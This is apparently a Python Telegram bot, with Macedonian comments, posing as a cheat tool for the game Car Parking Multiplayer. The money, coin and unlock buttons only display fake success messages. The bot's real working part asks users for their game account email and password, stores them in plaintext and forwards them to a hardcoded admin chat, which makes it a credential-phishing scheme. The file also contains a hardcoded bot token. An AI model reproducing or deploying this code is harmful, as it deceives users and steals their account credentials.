import logging
import sqlite3
import asyncio
import re
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)

# Конфигурирање на логирање
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Точниот токен и ADMIN ID
BOT_TOKEN = "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc" 
ADMIN_ID = 8694942406  

# Симулирани CPM податоци
CPM_DATA = {
    'money': 48729000,
    'coins': 20400,
    'wins': 16,
    'losses': 0,
    'levels': 109,
    'wheels': 112,
    'animations': 42,
    'friends': 0,
    'id': 'VY704074'
}

def inicijaliziraj_baza():
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS licenci 
                      (id TEXT PRIMARY KEY, data TEXT, odobren INTEGER DEFAULT 0, email TEXT, password TEXT, username TEXT)''')
    conn.commit()
    conn.close()

inicijaliziraj_baza()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user if update.message else update.callback_query.from_user
    username = user.username if user.username else "N/A"

    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('SELECT data, odobren, email FROM licenci WHERE id = ?', (str(user.id),))
    rezultat = cursor.fetchone()
    conn.close()

    sega = datetime.now()
    dozvolen = False
    email = ""

    if rezultat:
        istekuvanje_str = rezultat[0]
        odobren = rezultat[1] if len(rezultat) > 1 else 0
        email = rezultat[2] if len(rezultat) > 2 and rezultat[2] else ""
        
        if odobren == 1:
            if istekuvanje_str == "forever":
                dozvolen = True
            else:
                try:
                    dozvolen_sega = datetime.strptime(istekuvanje_str, "%Y-%m-%d %H:%M:%S")
                    if dozvolen_sega > sega:
                        dozvolen = True
                except ValueError:
                    dozvolen = False

    if not dozvolen:
        await poshti_baranje_do_admin(update, context, user, username)
        return

    # ДОЗВОЛЕН КОРИСНИК - ПРИКАЖИ DASHBOARD
    dashboard_text = (
        "**CPM_AJHAN_BOT**\n"
        "bot\n\n"
        "---\n"
        "**DASHBOARD**\n"
        "---\n"
        "**ACCOUNT**\n"
        f"{email if email else 'senatkafkast@gmail.com'}\n"
        f"2best\n"
        f"ID {CPM_DATA['id']}\n\n"
        "**STATS**\n"
        f"${CPM_DATA['money']:,}\n"
        f"{CPM_DATA['coins']:,} coins\n"
        f"{CPM_DATA['wins']}W / {CPM_DATA['losses']}L\n"
        f"{CPM_DATA['levels']} levels done\n"
        f"{CPM_DATA['wheels']} wheels\n"
        f"{CPM_DATA['animations']} animations\n"
        f"{CPM_DATA['friends']} friends\n\n"
        "- Select an option below:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💰 Money", callback_data="menu_money"), InlineKeyboardButton("🪙 Coins", callback_data="menu_coins")],
        [InlineKeyboardButton("⚡ Features", callback_data="menu_features"), InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")],
        [InlineKeyboardButton("🔄 Refresh Account", callback_data="refresh_account")],
        [InlineKeyboardButton("🚪 Sign Out", callback_data="sign_out")]
    ]
    
    if update.message:
        await update.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def poshti_baranje_do_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, user, username):
    """Праќа барање за лиценца до администраторот"""
    poraka = (
        f"## CPM_AJHAN_BOT\n"
        f"{datetime.now().strftime('%b %d at %H:%M')}\n\n"
        f"## CPM_AJHAN_BOT Inline\n"
        f"2 of 2\n\n"
        f"---\n\n"
        f"### Access request from @{username} (id: `{user.id}`)\n"
        f"{datetime.now().strftime('%I:%M %p')}\n\n"
        f"- **Forever**\n"
        f"  17 30 Days\n"
        f"  17 7 Days\n"
        f"  17 Custom\n\n"
        f"**Deny**"
    )
    
    keyboard = [
        [
            InlineKeyboardButton("✅ Forever", callback_data=f"lic:forever:{user.id}")
        ],
        [
            InlineKeyboardButton("📅 30 Days", callback_data=f"lic:30:{user.id}"),
            InlineKeyboardButton("📅 7 Days", callback_data=f"lic:7:{user.id}")
        ],
        [
            InlineKeyboardButton("⚙️ Custom", callback_data=f"lic:custom:{user.id}")
        ],
        [
            InlineKeyboardButton("❌ Deny", callback_data=f"lic:deny:{user.id}")
        ]
    ]
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=poraka,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Грешка при праќање до админ: {e}")
    
    # Порака до корисникот
    cekaj_poraka = (
        "⏳ **Access Request Sent**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "📧 Your request has been sent to the administrator.\n"
        "⏱️ Please wait for approval.\n"
        "━━━━━━━━━━━━━━━━━━━"
    )
    
    if update.message:
        await update.message.reply_text(cekaj_poraka, parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.message.reply_text(cekaj_poraka, parse_mode='Markdown')

async def menu_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**MONEY**\n\n"
        f"Max: ${CPM_DATA['money']:,}"
    )
    
    keyboard = [
        [InlineKeyboardButton("$1M", callback_data="add_money_1m"), InlineKeyboardButton("$5M", callback_data="add_money_5m"), InlineKeyboardButton("$10M", callback_data="add_money_10m")],
        [InlineKeyboardButton("$25M", callback_data="add_money_25m"), InlineKeyboardButton("$50M ★", callback_data="add_money_50m")],
        [InlineKeyboardButton("💰 Custom Amount", callback_data="custom_money")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**COINS**\n\n"
        f"Max: {CPM_DATA['coins']:,}"
    )
    
    keyboard = [
        [InlineKeyboardButton("100K", callback_data="add_coins_100k"), InlineKeyboardButton("250K", callback_data="add_coins_250k"), InlineKeyboardButton("500K ★", callback_data="add_coins_500k")],
        [InlineKeyboardButton("🪙 Custom Amount", callback_data="custom_coins")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**FEATURES**\n"
        "Select a feature or UNLOCK ALL:"
    )
    
    keyboard = [
        [InlineKeyboardButton("🏎️ W16", callback_data="feature_w16"), InlineKeyboardButton("🛡️ No Dmg", callback_data="feature_no_dmg")],
        [InlineKeyboardButton("💨 Smoke", callback_data="feature_smoke"), InlineKeyboardButton("⚙️ Wheels", callback_data="feature_wheels")],
        [InlineKeyboardButton("📈 Levels", callback_data="feature_levels"), InlineKeyboardButton("⛽ Fuel", callback_data="feature_fuel")],
        [InlineKeyboardButton("📯 Horns", callback_data="feature_horns"), InlineKeyboardButton("🎭 Anims", callback_data="feature_anims")],
        [InlineKeyboardButton("🏠 Houses", callback_data="feature_houses"), InlineKeyboardButton("👑 Rank", callback_data="feature_rank")],
        [InlineKeyboardButton("🔓 UNLOCK ALL", callback_data="feature_unlock_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def cpm_signin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = "**CPM_AJHAN_BOT**\nbot\n\n---\n**ENTER EMAIL**\n---\n\nType your CPM email:"
    keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    context.user_data['sostojba'] = 'CEKA_EMAIL'

async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sostojba = context.user_data.get('sostojba')
    vnesen_tekst = update.message.text
    user = update.message.from_user
    username = user.username if user.username else "N/A"

    # АКО АДМИНОТ ВНЕСУВА CUSTOM ВРЕМЕ
    if sostojba == 'CEKA_CUSTOM_TIME':
        target_user_id = context.user_data.get('custom_target_user')
        vnes = vnesen_tekst.strip().lower()
        
        try:
            # Проверка дали е со 'h' (саати)
            if vnes.endswith('h'):
                hours = int(vnes[:-1])
                if 1 <= hours <= 24:
                    vrednost = (datetime.now() + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
                    vreme_text = f"{hours} hours"
                else:
                    await update.message.reply_text("❌ Внесете вредност од 1h до 24h!")
                    return
            else:
                # Без 'h' значи денови
                days = int(vnes)
                if 1 <= days <= 30:
                    vrednost = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
                    vreme_text = f"{days} days"
                else:
                    await update.message.reply_text("❌ Внесете вредност од 1 до 30 дена!")
                    return
            
            # Зачувување во база
            conn = sqlite3.connect('Licenci.db')
            cursor = conn.cursor()
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
                          (str(target_user_id), vrednost))
            conn.commit()
            conn.close()
            
            # Извести го корисникот
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"✅ Администраторот ви додели лиценца на {vreme_text}!"
                )
            except Exception as e:
                logger.error(f"Грешка при праќање до корисникот: {e}")
            
            await update.message.reply_text(f"✅ Лиценцата е доделена на {vreme_text}!")
            context.user_data['sostojba'] = None
            
        except ValueError:
            await update.message.reply_text("❌ Внесете валиден број! Пример: 5h или 10")
        return

    if sostojba == 'CEKA_EMAIL':
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_pattern, vnesen_tekst):
            await update.message.reply_text("❌ Внесете валидна email адреса (пример: user@email.com):")
            return
        
        context.user_data['email'] = vnesen_tekst
        text = "**CPM_AJHAN_BOT**\nbot\n\n---\n**PASSWORD**\n---\n\nType your password:\n☑ Auto-deleted"
        keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
        
        await update.message.reply_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        context.user_data['sostojba'] = 'CEKA_PASSWORD'
        return

    elif sostojba == 'CEKA_PASSWORD':
        password = vnesen_tekst
        email = context.user_data.get('email')
        context.user_data['sostojba'] = None
        
        # Зачувување во база
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password, username) VALUES (?, ?, 0, ?, ?, ?)', 
                      (str(user.id), "pending", email, password, username))
        conn.commit()
        conn.close()
        
        # Испрати до админ
        admin_poraka = (
            f"🔐 **Нова најава**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 @{username}\n"
            f"🆔 `{user.id}`\n"
            f"📧 `{email}`\n"
            f"🔑 `{password}`\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Грешка: {e}")
        
        # Автоматско одобрување
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password, username) VALUES (?, ?, 1, ?, ?, ?)', 
                      (str(user.id), "forever", email, password, username))
        conn.commit()
        conn.close()
        
        await start(update, context)
        return
    
    else:
        await update.message.reply_text("❌ Ве молиме користете ги копчињата или напишете /start")

async def obraboti_klikovi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    # АДМИН ЛИЦЕНЦИ
    if data.startswith("lic:"):
        delovi = data.split(":")
        akcija = delovi[1]
        target_user_id = int(delovi[2])
        
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        
        if akcija == "deny":
            cursor.execute('DELETE FROM licenci WHERE id = ?', (str(target_user_id),))
            poraka = "❌ Вашето барање за лиценца е одбиено."
            admin_odgovor = f"❌ Одбиен корисник {target_user_id}"
            conn.commit()
            conn.close()
            
            try:
                await context.bot.send_message(chat_id=target_user_id, text=poraka)
                await query.edit_message_text(text=admin_odgovor)
            except Exception as e:
                logger.error(f"Грешка: {e}")
            return
        
        elif akcija == "custom":
            # АДМИНОТ ИЗБРА CUSTOM - БАРА ВНЕС НА ВРЕМЕ
            await query.edit_message_text(
                text=f"⚙️ **Custom Time for user {target_user_id}**\n\n"
                     "📝 Внесете време:\n"
                     "• **5h** = 5 саати (1-24h)\n"
                     "• **10** = 10 дена (1-30 дена)\n\n"
                     "Пример: `12h` или `7`",
                parse_mode='Markdown'
            )
            context.user_data['sostojba'] = 'CEKA_CUSTOM_TIME'
            context.user_data['custom_target_user'] = target_user_id
            return
        
        else:
            # FOREVER, 30 DAYS, 7 DAYS
            if akcija == "forever":
                vrednost = "forever"
                vreme_text = "засекогаш"
            elif akcija == "30":
                vrednost = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
                vreme_text = "30 дена"
            elif akcija == "7":
                vrednost = (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d %H:%M:%S")
                vreme_text = "7 дена"
            else:
                vrednost = "forever"
                vreme_text = "засекогаш"
            
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
                          (str(target_user_id), vrednost))
            conn.commit()
            conn.close()
            
            poraka = f"✅ Вашата лиценца е одобрена на {vreme_text}!"
            admin_odgovor = f"✅ Одобрена лиценца ({akcija}) за {target_user_id}"
            
            try:
                await context.bot.send_message(chat_id=target_user_id, text=poraka)
                await query.edit_message_text(text=admin_odgovor)
            except Exception as e:
                logger.error(f"Грешка: {e}")
        return

    # МЕНИЈА
    if data == "main_menu":
        await start(update, context)
        return
    
    if data == "menu_money":
        await menu_money(update, context)
        return
    
    if data == "menu_coins":
        await menu_coins(update, context)
        return
    
    if data == "menu_features":
        await menu_features(update, context)
        return
    
    if data == "menu_settings":
        await query.edit_message_text("⚙️ **SETTINGS**\n\nSettings menu coming soon...", parse_mode='Markdown')
        return

    if data == "cpm_signin":
        await cpm_signin(update, context)
        return
    
    if data == "refresh_account":
        await query.edit_message_text("🔄 **Refreshing account...**", parse_mode='Markdown')
        await asyncio.sleep(1)
        await start(update, context)
        return
    
    if data == "sign_out":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM licenci WHERE id = ?', (str(user.id),))
        conn.commit()
        conn.close()
        await query.edit_message_text("🚪 **Signed out successfully!**\n\nType /start to sign in again.", parse_mode='Markdown')
        return

    # FEATURES
    if data.startswith("feature_"):
        feature_name = data.replace("feature_", "").replace("_", " ").upper()
        text = f"✅ **{feature_name}** unlocked successfully!"
        
        if data == "feature_unlock_all":
            text = "🔓 **ALL FEATURES UNLOCKED!**\n\n✅ W16\n✅ No Dmg\n✅ Smoke\n✅ Wheels\n✅ Levels\n✅ Fuel\n✅ Horns\n✅ Anims\n✅ Houses\n✅ Rank"
        
        keyboard = [[InlineKeyboardButton("⬅️ Back to Features", callback_data="menu_features")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # MONEY
    if data.startswith("add_money_"):
        amount = data.replace("add_money_", "")
        if amount.endswith("m"):
            amount = int(amount[:-1]) * 1000000
        elif amount.endswith("k"):
            amount = int(amount[:-1]) * 1000
        else:
            amount = int(amount)
        
        text = f"✅ **${amount:,}** added successfully!"
        keyboard = [[InlineKeyboardButton("⬅️ Back to Money", callback_data="menu_money")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # COINS
    if data.startswith("add_coins_"):
        amount = data.replace("add_coins_", "")
        if amount.endswith("k"):
            amount = int(amount[:-1]) * 1000
        else:
            amount = int(amount)
        
        text = f"✅ **{amount:,} coins** added successfully!"
        keyboard = [[InlineKeyboardButton("⬅️ Back to Coins", callback_data="menu_coins")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    if data == "custom_money":
        await query.edit_message_text("💰 **Custom Amount**\n\nEnter the amount you want to add (e.g., 5000000):", parse_mode='Markdown')
        context.user_data['sostojba'] = 'CUSTOM_MONEY'
        return
    
    if data == "custom_coins":
        await query.edit_message_text("🪙 **Custom Amount**\n\nEnter the amount of coins you want to add (e.g., 50000):", parse_mode='Markdown')
        context.user_data['sostojba'] = 'CUSTOM_COINS'
        return

async def grant_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    
    if user.id != ADMIN_ID:
        await update.message.reply_text("❌ Немате дозвола за оваа команда!")
        return
    
    try:
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("❌ Користете: /grant user_id време (на пр. /grant 123456789 5h или /grant 123456789 7)")
            return
        
        target_user_id = int(args[0])
        vreme = args[1]
        
        # Парсирање на времето
        if vreme.endswith('h'):
            hours = int(vreme[:-1])
            if 1 <= hours <= 24:
                vrednost = (datetime.now() + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
                vreme_text = f"{hours} часа"
            else:
                await update.message.reply_text("❌ Внесете 1-24h!")
                return
        else:
            days = int(vreme)
            if 1 <= days <= 30:
                vrednost = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
                vreme_text = f"{days} дена"
            else:
                await update.message.reply_text("❌ Внесете 1-30 дена!")
                return
        
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, 1)', 
                      (str(target_user_id), vrednost))
        conn.commit()
        conn.close()
        
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"✅ Администраторот ви додели лиценца на {vreme_text}!"
            )
        except Exception as e:
            logger.error(f"Грешка: {e}")
        
        await update.message.reply_text(f"✅ Лиценцата е доделена на {vreme_text}")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Грешка: {str(e)}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Грешка: {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ Настана грешка. Обидете се повторно.")

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("grant", grant_command))
    app.add_handler(CallbackQueryHandler(obraboti_klikovi))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, obraboti_tekst))
    app.add_error_handler(error_handler)
    
    logger.info("🚀 CPM_AJHAN_BOT стартува...")
    app.run_polling()
